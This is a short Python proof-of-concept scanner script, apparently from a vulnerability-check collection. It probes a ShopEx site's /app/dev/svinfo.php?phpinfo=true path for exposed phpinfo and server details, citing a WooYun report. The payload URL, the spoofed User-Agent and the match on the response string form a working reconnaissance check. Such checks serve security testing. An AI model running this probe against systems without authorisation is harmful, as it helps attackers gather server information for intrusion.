#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: shopex敏感信息泄露
referer: http://www.wooyun.org/bugs/wooyun-2010-0100121
author: Lucifer
description: 路径 app/dev/svinfo.php,打开后可看到服务器测评信息及phpinfo等相关敏感信息。
'''
import sys
import requests
import warnings
from termcolor import cprint

class shopex_phpinfo_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        }
        payload = "/app/dev/svinfo.php?phpinfo=true"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r"Configuration File (php.ini) Path" in req.text:
                cprint("[+]存在shopex敏感信息泄露...(敏感信息)\tpayload: "+vulnurl, "green")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = shopex_phpinfo_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()